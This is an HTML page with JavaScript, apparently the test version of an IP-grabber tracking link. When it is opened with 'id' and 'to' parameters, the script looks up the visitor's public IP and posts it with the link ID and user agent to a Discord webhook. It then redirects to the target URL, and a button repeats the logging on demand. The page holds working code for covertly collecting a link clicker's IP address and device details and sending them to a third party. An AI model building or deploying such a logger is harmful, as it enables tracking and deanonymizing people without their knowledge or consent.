<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Grabber Diagnose</title>
    <style>
        body { font-family: Arial; background: #111; color: #eee; padding: 20px; }
        .box { background: #1e1e1e; border-radius: 12px; padding: 20px; max-width: 600px; margin: 20px auto; }
        .success { color: #4ade80; }
        .error { color: #f87171; }
        button { background: #2563eb; border: none; padding: 12px 24px; color: white; border-radius: 40px; cursor: pointer; }
    </style>
</head>
<body>
<div class="box">
    <h2>🔍 IP-Logger Test</h2>
    <div id="status">Warte auf Link-Parameter...</div>
    <div id="log"></div>
    <button id="forceTest" style="margin-top:20px;">Test mit eigener IP (lokal)</button>
</div>

<script>
    (function() {
        const statusEl = document.getElementById('status');
        const logEl = document.getElementById('log');

        function log(msg, isError = false) {
            const p = document.createElement('p');
            p.textContent = msg;
            p.className = isError ? 'error' : 'success';
            logEl.appendChild(p);
        }

        async function fetchIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                log('❌ IP-Abfrage fehlgeschlagen: ' + e.message, true);
                return null;
            }
        }

        async function sendDiscordTest(ip, linkId) {
            const webhook = localStorage.getItem('test_webhook') || prompt('Bitte Discord Webhook URL eingeben (für Test):');
            if (!webhook) return false;
            try {
                await fetch(webhook, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        content: `🧪 Testaufruf von Diagnoseseite\nIP: ${ip}\nLink-ID: ${linkId}\nUser-Agent: ${navigator.userAgent}`
                    })
                });
                log('✅ Discord-Nachricht gesendet');
                return true;
            } catch(e) {
                log('❌ Discord senden fehlgeschlagen: ' + e.message, true);
                return false;
            }
        }

        async function handleRedirect() {
            const params = new URLSearchParams(window.location.search);
            const id = params.get('id');
            const to = params.get('to');
            
            if (!id || !to) {
                statusEl.textContent = 'Keine Parameter gefunden – dies ist die Diagnoseseite.';
                return false;
            }

            statusEl.textContent = `Link erkannt: ID=${id}, Ziel=${to}`;
            
            // IP ermitteln
            const ip = await fetchIP();
            if (ip) {
                log(`✅ Deine öffentliche IP: ${ip}`);
            } else {
                log('⚠️ Konnte IP nicht ermitteln');
            }

            // Discord senden
            await sendDiscordTest(ip || 'unbekannt', id);

            // Kurze Verzögerung dann weiterleiten
            setTimeout(() => {
                window.location.href = to;
            }, 3000);
            
            return true;
        }

        // Force Test Button
        document.getElementById('forceTest').addEventListener('click', async () => {
            const ip = await fetchIP();
            if (ip) log('Eigene IP: ' + ip);
            await sendDiscordTest(ip, 'manual-test');
        });

        // Automatisch starten
        handleRedirect();
    })();
</script>
</body>
</html>
